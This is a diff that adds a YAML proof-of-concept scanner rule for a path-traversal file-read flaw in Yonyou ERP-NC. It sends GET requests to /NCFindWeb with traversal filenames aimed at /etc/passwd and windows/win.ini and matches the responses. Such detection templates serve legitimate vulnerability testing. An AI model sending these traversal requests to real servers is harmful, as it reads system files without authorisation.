@@ -1,0 +1,23 @@
+name: poc-yaml-yonyou-ERP-NC-readfile
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=../../../../../etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /NCFindWeb?service=IPreAlertConfigService&filename=../../../../../../../../../../../../windows/win.ini
+            follow_redirects: false
+        expression: response.status == 200 && "for 16-bit app support".bmatches(response.body)
+expression: r0() || r1()
+detail:
+  author: wooluo
+  links:
+    - https://blog.csdn.net/weixin_33238272/article/details/116253539
